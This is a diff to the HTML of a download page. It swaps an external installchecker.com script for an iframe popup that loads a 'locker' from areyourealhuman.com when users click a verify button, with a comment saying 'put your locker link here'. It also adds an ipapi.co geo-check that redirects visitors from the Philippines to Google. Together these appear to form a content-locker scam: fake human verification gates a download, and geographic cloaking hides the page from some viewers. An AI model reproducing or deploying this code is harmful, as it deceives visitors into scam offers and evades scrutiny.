@@ -10,8 +10,6 @@
 
   <link rel="icon" type="image/png" sizes="16x16" href="https://i.ibb.co/N224P2Zv/favicon-16x16.png" />
 
-  <script type="text/javascript" id="ogjs" src="https://installchecker.com/cl/js/kld9n8"></script>
-
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-T1M6M1HTJ8"></script>
   <script>
@@ -96,7 +94,7 @@
       margin-top: 20px;
       background-color: #1961f3;
       color: white;
-      padding: 12px 24px;
+      padding: 16px 24px;
       font-size: 16px;
       border-radius: 8px;
       text-decoration: none;
@@ -104,6 +102,7 @@
       transition: background 0.3s ease;
       animation: pulseScale 2s infinite ease-in-out;
       cursor: pointer;
+      box-shadow: 0 5px 15px rgba(25, 97, 243, 0.4);
     }
 
     @keyframes pulseScale {
@@ -297,6 +296,53 @@
         opacity: 1;
       }
     }
+
+    /* Overlay */
+    .iframe-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      justify-content: center;
+      align-items: center;
+      z-index: 10000;
+    }
+
+    /* Popup box */
+    .iframe-box {
+      background: #131313;
+      max-width: 800px;
+      width: 90%;
+      height: 80%;
+      padding: 10px;
+      border-radius: 12px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Iframe itself */
+    .iframe-frame {
+      flex: 1;
+      border: none;
+      border-radius: 8px;
+      width: 100%;
+    }
+
+    /* Close button */
+    #iframePopup button,
+    #closeIframe {
+      margin-top: 10px;
+      padding: 12px;
+      border: none;
+      background: #1961f3;
+      color: white;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+    }
   </style>
 
 </head>
@@ -351,6 +397,15 @@
     </div>
   </div>
 
+  <!-- Locker Iframe Popup -->
+  <div class="iframe-overlay" id="iframePopup">
+    <div class="iframe-box">
+      <iframe id="iframeLocker" src="" class="iframe-frame">
+      </iframe>
+      <button id="closeIframe">Close</button>
+    </div>
+  </div>
+
   <script>
     document.querySelectorAll(".download-btn").forEach(btn => {
       btn.addEventListener("click", function (e) {
@@ -363,6 +418,26 @@
     document.getElementById("verifyBtn").addEventListener("click", function () {
       og_load();
       document.getElementById("popup").style.display = "none";
+      document.body.style.overflow = "auto";
+    });
+  </script>
+
+  <script>
+    const iframePopup = document.getElementById("iframePopup");
+    const iframeLocker = document.getElementById("iframeLocker");
+    const closeIframe = document.getElementById("closeIframe");
+
+    // When verify button is clicked → open iframe popup
+    document.getElementById("verifyBtn").addEventListener("click", function () {
+      iframeLocker.src = "https://areyourealhuman.com/cl/i/kld9n8"; // put your locker link here
+      iframePopup.style.display = "flex";
+      document.body.style.overflow = "hidden";
+    });
+
+    // Close iframe popup
+    closeIframe.addEventListener("click", function () {
+      iframePopup.style.display = "none";
+      iframeLocker.src = ""; // clear src
       document.body.style.overflow = "auto";
     });
   </script>
@@ -428,7 +503,21 @@
     })();  
   </script>
 
-</body>
+  <script>
+    (async function () {
+      try {
+        let res = await fetch("https://ipapi.co/json/");
+        let data = await res.json();
 
+        if (data.country_code === "PH") {
+          window.location.href = "https://www.google.com/";
+        }
+      } catch (e) {
+        console.error("Geo check failed", e);
+      }
+    })();
+  </script>
+
+</body>
 
 </html>
